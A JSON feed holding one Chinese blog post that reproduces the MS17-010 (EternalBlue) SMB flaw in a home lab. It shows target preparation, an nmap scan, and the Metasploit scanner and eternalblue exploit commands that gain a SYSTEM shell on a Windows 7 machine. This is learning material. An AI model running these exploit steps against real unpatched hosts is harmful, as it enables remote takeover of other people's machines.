{
    "version": "https://jsonfeed.org/version/1",
    "title": "dpm12345 • All posts by \"ms17\" tag",
    "description": "学习记录",
    "home_page_url": "http://dpm12345.cn",
    "items": [
        {
            "id": "http://dpm12345.cn/posts/65089f0a/",
            "url": "http://dpm12345.cn/posts/65089f0a/",
            "title": "ms17-010 漏洞复现",
            "date_published": "2022-08-24T05:05:51.000Z",
            "content_html": "<h1 id=\"漏洞介绍\"><a href=\"#漏洞介绍\" class=\"headerlink\" title=\"漏洞介绍\"></a>漏洞介绍</h1><h2 id=\"名称\"><a href=\"#名称\" class=\"headerlink\" title=\"名称\"></a>名称</h2><p>MS17-010，又称永恒之蓝</p>\n<h2 id=\"利用原理\"><a href=\"#利用原理\" class=\"headerlink\" title=\"利用原理\"></a>利用原理</h2><p>永恒之蓝漏洞通过 TCP 的 445 和 139 端口，来利用 SMBv1 和 NBT 中的远程代码执行漏洞，通过恶意代码扫描并攻击开放 445 文件共享端口的 Windows 主机。只要用户主机开机联网，即可通过该漏洞控制用户的主机。不法分子就能在其电脑或服务器中植入勒索病毒、窃取用户隐私、远程控制木马等恶意程序。</p>\n<h2 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h2><p>目前已知受影响的Windows版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>\n<h1 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h1><h2 id=\"复现环境\"><a href=\"#复现环境\" class=\"headerlink\" title=\"复现环境\"></a>复现环境</h2><ul>\n<li>攻击机：kali </li>\n<li>目标机：windows_7_professional_with_sp1_x64</li>\n</ul>\n<p>实验条件：双方机子可以相互 ping 通，目标机开启了 445 端口，并且关闭了防火墙</p>\n<p>[注：1. netstat -an 查看端口开启状态，如果未开启，可以采用以下方法]{.red}</p>\n<pre><code class=\"raw\">1、按 “Win+R” 组合键，输入 regedit 打开注册表编辑器；\n\n2、打开 HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\NetBT\\Parameters ；\n\n3、在右侧找到 SMBDeviceEnabled，双击将键值更改为 1 ；\n</code></pre>\n<p>[2. 如果端口开启，再检查防火墙是否关闭（之前就因为防火墙没关导致nmap扫描不出)]{.red}</p>\n<p>[3. 如果为了安装 VMware tools 的驱动而安装了 KB4474419 的补丁，那么在开始之前需要将更新卸载掉，不然无法利用该漏洞]{.red}</p>\n<h2 id=\"复现过程\"><a href=\"#复现过程\" class=\"headerlink\" title=\"复现过程\"></a>复现过程</h2><pre><code class=\"bash\">nmap 192.168.47.139  #扫描目标机\n</code></pre>\n<p>返回</p>\n<p><img data-src=\"/../post_images/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_1.jpg\"></p>\n<p>可以看到 445 端口的状态为<code>open</code></p>\n<h3 id=\"使用-msfconsole-的永恒之蓝模块\"><a href=\"#使用-msfconsole-的永恒之蓝模块\" class=\"headerlink\" title=\"使用 msfconsole 的永恒之蓝模块\"></a>使用 msfconsole 的永恒之蓝模块</h3><h3 id=\"搜索使用\"><a href=\"#搜索使用\" class=\"headerlink\" title=\"搜索使用\"></a>搜索使用</h3><pre><code class=\"bash\">search ms17-010\n</code></pre>\n<p>得到</p>\n<p><img data-src=\"/../post_images/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_2.jpg\"></p>\n<p>其中</p>\n<p><code>exploit/windows/smb/ms17_010_eternalblue</code>为攻击模块</p>\n<p><code>auxiliary/scanner/smb/smb_ms17_010</code>为扫描模块</p>\n<h3 id=\"扫描\"><a href=\"#扫描\" class=\"headerlink\" title=\"扫描\"></a>扫描</h3><p>依次执行以下命令</p>\n<pre><code class=\"bash\">use auxiliary/scanner/smb/smb_ms17_010\nset rhosts 192.168.47.139 # rhost 值为目标机 ip\nrun\n</code></pre>\n<p>当返回</p>\n<p><img data-src=\"/../post_images/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_3.jpg\"></p>\n<p>代表该漏洞可以利用，如果返回<code>Host does NOT appear vulnerable.</code>，则检查更新安装情况，尝试卸载</p>\n<h3 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h3><p>依次执行以下命令</p>\n<pre><code class=\"bash\">use exploit/windows/smb/ms17_010_eternalblue\nset rhosts 192.168.47.139\nrun\n</code></pre>\n<p><img data-src=\"/../post_images/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_4.jpg\"></p>\n<p><img data-src=\"/../post_images/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_5.jpg\"></p>\n<p>可以看到为系统权限</p>\n<p>输入<code>shell</code>，若有乱码，那么再输入<code>chcp 65001</code></p>\n",
            "tags": [
                "ms17",
                "msf"
            ]
        }
    ]
}